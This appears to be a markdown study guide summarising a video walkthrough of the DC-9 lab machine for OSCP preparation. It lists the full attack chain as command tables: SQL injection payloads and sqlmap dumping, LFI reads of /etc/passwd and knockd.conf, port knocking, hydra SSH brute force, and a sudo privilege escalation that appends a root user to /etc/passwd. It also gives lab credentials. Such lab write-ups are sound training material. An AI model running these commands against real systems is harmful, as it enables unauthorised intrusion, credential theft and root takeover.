@@ -1,0 +1,105 @@
+This is a comprehensive breakdown of the DC-9 machine walkthrough, including the notes, methodologies, and commands required for your OSCP preparation.
+
+The machine exploitation involves a chain of vulnerabilities: **SQL Injection** → **Local File Inclusion (LFI)** → **Port Knocking** → **Credential Spraying** → **Privilege Escalation via `sudo` executable.**
+
+***
+
+## 1. Initial Enumeration & Web Reconnaissance
+
+The initial phase focuses on discovering running services, hidden files, and parameters on the web server.
+
+### ⚙️ Essential Commands
+
+| Command | Purpose | Timestamp |
+| :--- | :--- | :--- |
+| `nmap -p- -sC -sV $TARGET_IP -oA nmap/initial` | Full TCP port scan with default script and service version detection. Only **Port 80 (HTTP)** is found to be open initially. | [[30:43](http://www.youtube.com/watch?v=fUfj5LXIHW0&t=1843)] |
+| `wfuzz -c -z file,/path/to/wordlist/common.txt --hc 404 http://$TARGET_IP/FUZZ` | Directory and file fuzzing to find pages like `display.php`, `search.php`, `manage.php`, and `welcome.php`. | [[33:13](http://www.youtube.com/watch?v=fUfj5LXIHW0&t=1993)] |
+| `nikto -host http://$TARGET_IP` | Automated web server scanner to identify known vulnerabilities and configurations. | [[39:01](http://www.youtube.com/watch?v=fUfj5LXIHW0&t=2341)] |
+
+***
+
+## 2. Exploiting SQL Injection (SQLi)
+
+The `search.php` page is found to be vulnerable to SQL Injection, which is exploited to dump the entire user database.
+
+### 📝 Key Notes
+
+* **Vulnerable Page:** `http://$TARGET_IP/search.php`
+* **Vulnerable Parameter:** The `search` POST parameter.
+* The login page at `manage.php` shows a generic error, which is a good indicator against username enumeration, but not brute-force.
+
+### 💉 SQLi & Dumping Commands
+
+| Command | Purpose | Timestamp |
+| :--- | :--- | :--- |
+| `or 1=1-- ` or ` ' or 1=1-- ` | Manual test payload to confirm the SQLi vulnerability. The double-dash (`-- `) comments out the rest of the query. | [[40:06](http://www.youtube.com/watch?v=fUfj5LXIHW0&t=2406)] |
+| `sqlmap -r req --dump -D users --batch --dbms=mysql` | Uses the captured HTTP request (`req` file) to automatically find the injectable point, identify the database management system (DBMS) as **MySQL**, and **dump** all data from the **`users`** database. | [[42:08](http://www.youtube.com/watch?v=fUfj5LXIHW0&t=2528)] |
+| **Cracked Admin Password:** | The hash for `admin` is cracked using an online service (CrackStation in the video) and is found to be: **`transorbital_one`**. | [[52:39](http://www.youtube.com/watch?v=fUfj5LXIHW0&t=3159)] |
+
+***
+
+## 3. Local File Inclusion (LFI) & Port Knocking
+
+Logging in as `admin:transorbital_one` leads to `welcome.php`, where a new vulnerability, Local File Inclusion (LFI), is discovered and used to find the Port Knocking sequence.
+
+### 🔑 LFI Discovery and Exploitation
+
+* **Vulnerable Page:** `http://$TARGET_IP/welcome.php`
+* **Vulnerable Parameter:** `file` (discovered via fuzzing, e.g., `welcome.php?file=FUZZ`).
+* **Authenticated Fuzzing:** The LFI is only accessible after logging in, requiring the **PHPSESSID** cookie to be passed during fuzzing.
+
+| Command | Purpose | Timestamp |
+| :--- | :--- | :--- |
+| `wfuzz -c -z file,/path/to/param_names.txt -b "PHPSESSID=$ID" --hc 404,302,963 http://$TARGET_IP/welcome.php?FUZZ=some_data` | Authenticated fuzzing to find the hidden parameter name. The `-b` option passes the cookie. Parameter discovered: **`file`**. | [[59:35](http://www.youtube.com/watch?v=fUfj5LXIHW0&t=3575)] |
+| `http://$TARGET_IP/welcome.php?file=/etc/passwd` | Verifies LFI by reading the system's user list. | [[01:00:41](http://www.youtube.com/watch?v=fUfj5LXIHW0&t=3641)] |
+| `http://$TARGET_IP/welcome.php?file=/etc/knockd.conf` | Reads the Knock Daemon configuration file to find the sequence to open SSH. | [[01:11:13](http://www.youtube.com/watch?v=fUfj5LXIHW0&t=4273)] |
+
+### 🔓 Port Knocking & SSH Access
+
+The `knockd.conf` file reveals the sequence for the **`open_ssh`** command.
+
+* **Knock Sequence:** **2000, 3000, 4000**
+
+| Command | Purpose | Timestamp |
+| :--- | :--- | :--- |
+| `for x in 2000 3000 4000; do nmap -Pn --max-retries 0 -p $x $TARGET_IP; done` | Sends a series of TCP packets to the target on the specified ports, which the `knockd` service detects and runs the command to open Port 22. | [[01:12:47](http://www.youtube.com/watch?v=fUfj5LXIHW0&t=4367)] |
+| `nmap -p22 $TARGET_IP` | Confirms that **Port 22 (SSH)** is now open. | [[01:13:44](http://www.youtube.com/watch?v=fUfj5LXIHW0&t=4424)] |
+| `hydra -L users -P passwords $TARGET_IP ssh` | Uses the user/password list exfiltrated via `sqlmap` to brute-force the SSH service, finding credentials for users like **`janitor`** and **`fred_f`**. | [[01:23:06](http://www.youtube.com/watch?v=fUfj5LXIHW0&t=4986)] |
+
+***
+
+## 4. Privilege Escalation
+
+After logging in as a standard user (e.g., `fred_f`), the focus shifts to finding a way to execute commands as **root**.
+
+### 📈 Privesc Discovery
+
+| Command | Purpose | Timestamp |
+| :--- | :--- | :--- |
+| `sudo -l` | Lists the commands the current user (`fred_f`) can execute with **root** privileges (`NOPASSWD`). The user is able to run the Python script: **`/opt/dev_stuff/dist/test/test`**. | [[01:24:58](http://www.youtube.com/watch?v=fUfj5LXIHW0&t=5098)] |
+| `cat /opt/dev_stuff/dist/test/test` | Analyzing the script shows it takes two arguments: a file to **read** (first argument) and a file to **append** to (second argument) using Python's `open(file, 'r')` and `open(file, 'a')` functions. | [[01:25:37](http://www.youtube.com/watch?v=fUfj5LXIHW0&t=5137)] |
+
+### 💥 Exploitation (Injecting a Root User)
+
+This is exploited by having the script append a manually crafted root-level user entry into `/etc/passwd`.
+
+1.  **Create Payload File (`/var/temp/offsec`):**
+    A new user entry is created with a User ID (UID) of **0** and Group ID (GID) of **0** (root), and a known password hash.
+
+    * **Payload Format:** `username:password_hash:UID:GID:Comment:Home_Dir:Shell`
+    * **Payload Entry:** `offsec:HASH:0:0::/root:/bin/bash`
+        * The hash used in the video corresponds to the password **`i_heart_hacking`**.
+
+2.  **Append to `/etc/passwd`:** The user runs the authorized script to append the new user to the `/etc/passwd` file.
+
+| Command | Purpose | Timestamp |
+| :--- | :--- | :--- |
+| `echo 'offsec:HASH:0:0::/root:/bin/bash' > /var/temp/offsec` | Creates the payload file in a world-writable directory (`/var/temp`). *Note: In a real scenario, use a properly generated hash.* | [[01:31:00](http://www.youtube.com/watch?v=fUfj5LXIHW0&t=5460)] |
+| `sudo /opt/dev_stuff/dist/test/test /var/temp/offsec /etc/passwd` | Executes the script as **root** to **append** the new root user entry from `/var/temp/offsec` to `/etc/passwd`. | [[01:31:21](http://www.youtube.com/watch?v=fUfj5LXIHW0&t=5481)] |
+| `su offsec` | Switches user to the newly created root user, using the password **`i_heart_hacking`**. | [[01:32:39](http://www.youtube.com/watch?v=fUfj5LXIHW0&t=5559)] |
+| `cat /root/flag.txt` | Retrieves the final flag from the root directory. | [[01:33:05](http://www.youtube.com/watch?v=fUfj5LXIHW0&t=5585)] |
+
+***
+
+This machine demonstrates crucial OSCP topics including web app exploitation (SQLi, LFI), network service manipulation (Port Knocking), and Linux privesc via misconfigured `sudo` permissions.
+http://googleusercontent.com/youtube_content/0
